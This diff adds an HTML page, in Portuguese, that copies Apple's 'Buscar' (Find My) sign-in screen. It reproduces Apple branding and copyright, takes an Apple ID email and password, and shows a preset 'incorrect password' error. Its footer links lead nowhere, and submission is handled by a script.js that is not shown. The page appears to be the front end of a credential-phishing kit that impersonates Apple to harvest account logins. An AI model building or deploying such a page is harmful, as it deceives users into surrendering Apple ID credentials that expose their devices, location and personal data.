@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Buscar - Encontre seus dispositivos Apple">
+    <title>Buscar</title>
+    <link rel="icon" href="logo.png" type="image/png">
+    <link rel="apple-touch-icon" href="logo.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <!-- Logo -->
+            <div class="logo-wrapper" id="logoWrapper">
+                <img src="logo.png" alt="Buscar" class="logo" id="logo">
+            </div>
+
+            <!-- Title -->
+            <h1 class="title">Buscar</h1>
+
+            <!-- Description -->
+            <p class="description">
+                Busque seu iPhone, iPad, Mac, Apple Watch, AirPods ou Beats. Ou ajude a localizar os dispositivos de Compartilhamento Familiar.
+            </p>
+
+            <!-- Login Form -->
+            <form id="loginForm" autocomplete="off">
+                <div class="input-group" id="emailGroup">
+                    <label for="email" class="input-label">ID Apple</label>
+                    <div class="input-wrapper">
+                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/>
+                        </svg>
+                        <input 
+                            type="email" 
+                            id="email" 
+                            name="email" 
+                            placeholder="email@exemplo.com"
+                            required
+                            autocomplete="off"
+                            inputmode="email"
+                        >
+                    </div>
+                </div>
+
+                <div class="input-group" id="passwordGroup">
+                    <label for="password" class="input-label">Senha</label>
+                    <div class="input-wrapper">
+                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                            <path d="M7 11V7a5 5 0 0110 0v4"/>
+                        </svg>
+                        <input 
+                            type="password" 
+                            id="password" 
+                            name="password" 
+                            placeholder="Senha"
+                            required
+                            autocomplete="off"
+                        >
+                        <button type="button" class="toggle-password" id="togglePassword" aria-label="Mostrar senha">
+                            <svg class="eye-open" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                <circle cx="12" cy="12" r="3"/>
+                            </svg>
+                            <svg class="eye-closed" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="display:none">
+                                <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/>
+                                <line x1="1" y1="1" x2="23" y2="23"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Error Message -->
+                <div class="error-message" id="errorMessage">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="15" y1="9" x2="9" y2="15"/>
+                        <line x1="9" y1="9" x2="15" y2="15"/>
+                    </svg>
+                    <span>ID Apple ou senha incorreta.</span>
+                </div>
+
+                <button type="submit" class="btn-login" id="btnLogin">
+                    <span class="btn-text">Iniciar Sessão</span>
+                    <div class="btn-loader" id="btnLoader"></div>
+                </button>
+            </form>
+
+            <!-- Footer Links -->
+            <div class="footer-links">
+                <a href="#" class="footer-link">Esqueceu o ID Apple ou a senha?</a>
+                <a href="#" class="footer-link">Não tem um ID Apple? Crie um agora.</a>
+            </div>
+        </div>
+
+        <!-- Apple Footer -->
+        <footer class="apple-footer">
+            <div class="footer-content">
+                <span class="apple-logo">&#63743;</span>
+                <span class="copyright">Copyright © 2026 Apple Inc. Todos os direitos reservados.</span>
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
